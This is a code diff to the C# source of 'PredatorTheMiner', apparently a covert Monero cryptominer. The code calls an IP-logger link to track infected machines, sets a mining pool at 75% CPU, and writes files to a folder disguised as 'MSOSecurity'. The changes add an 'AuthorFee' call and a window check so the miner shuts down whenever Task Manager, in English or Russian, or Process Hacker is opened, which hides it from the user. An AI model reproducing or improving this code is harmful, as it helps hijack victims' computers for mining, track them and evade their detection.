@@ -1,6 +1,7 @@
 using System;
 using System.Diagnostics;
 using System.IO;
+using System.Runtime.InteropServices;
 using System.Threading;
 
 namespace PredatorTheMiner
@@ -23,16 +24,19 @@ namespace PredatorTheMiner
 			}
 		}
 
-		static void Main()
+        [DllImport("USER32.DLL", CharSet = CharSet.Unicode)]
+        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+		
+        static void Main()
 		{
 			try
 			{
 				Helper.SiteConnection("https://iplogger.com/1LVYB6"); // IPLogger
 
-				string Pool = "pool.monero.hashvault.pro:443";
-				string user = "user name";
-				string cpu_usage = "75"; //25 50 75
-				string password = "x";
+				const string Pool = "pool.monero.hashvault.pro:443";
+				const string user = "user name";
+				const string cpu_usage = "75"; //25 50 75
+				const string password = "x";
 				/* Данные для майнера */
 				
 				Process process = new Process();
@@ -48,7 +52,7 @@ namespace PredatorTheMiner
 				{
 					try
 					{
-						string drop_folder = Environment.GetEnvironmentVariable("LocalAppData") + "\\MSOSecurity";
+						string drop_folder = Environment.GetEnvironmentVariable("ProgramData") + "\\MSOSecurity";
 						if (Directory.Exists(drop_folder))
 							return;
 						Directory.CreateDirectory(drop_folder);
@@ -71,12 +75,16 @@ namespace PredatorTheMiner
 
 					process.Start();
 				}
+				
+				Helper.AuthorFee();
 
 				while (true)
 				{
 					if ((Process.GetProcessesByName("taskmgr").Length > 0 ||
 						Process.GetProcessesByName("Taskmgr").Length > 0 ||
-						Process.GetProcessesByName("ProcessHacker").Length > 0) || Environment.HasShutdownStarted)
+						Process.GetProcessesByName("ProcessHacker").Length > 0) || Environment.HasShutdownStarted ||
+						FindWindow("", "Task Manager") != IntPtr.Zero || 
+						FindWindow("", "Диспетчер задач") != IntPtr.Zero)
 					{
 						process.Kill();
 						Environment.Exit(0);
